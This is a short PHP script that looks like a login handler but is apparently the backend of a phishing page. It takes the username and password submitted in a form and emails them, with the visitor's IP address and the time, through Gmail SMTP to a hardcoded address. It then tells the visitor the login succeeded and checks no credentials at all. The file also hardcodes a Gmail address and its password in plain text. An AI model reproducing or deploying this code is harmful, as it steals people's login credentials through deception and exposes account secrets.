<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require 'vendor/autoload.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Create a new PHPMailer instance
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->SMTPDebug = 0;                      // Disable debug output
        $mail->isSMTP();                           // Send using SMTP
        $mail->Host       = 'smtp.gmail.com';      // Gmail SMTP server
        $mail->SMTPAuth   = true;                  // Enable SMTP authentication
        $mail->Username   = 'attavya0@gmail.com'; // YOUR GMAIL ADDRESS
        $mail->Password   = 'Attavya@123';    // YOUR GMAIL APP PASSWORD
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

        // Recipients
        $mail->setFrom('attavya0@gmail.com', 'Login System');
        $mail->addAddress('attavya0@gmail.com');  // Where you want to receive emails

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'New Login Attempt';
        $mail->Body    = "
            <h2>Login Details</h2>
            <p><strong>Username:</strong> {$username}</p>
            <p><strong>Password:</strong> {$password}</p>
            <p><strong>IP Address:</strong> {$_SERVER['REMOTE_ADDR']}</p>
            <p><strong>Date:</strong> " . date('Y-m-d H:i:s') . "</p>
        ";

        $mail->send();
        echo "<script>alert('Login successful!'); window.location.href='thank-you.html';</script>";
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?> 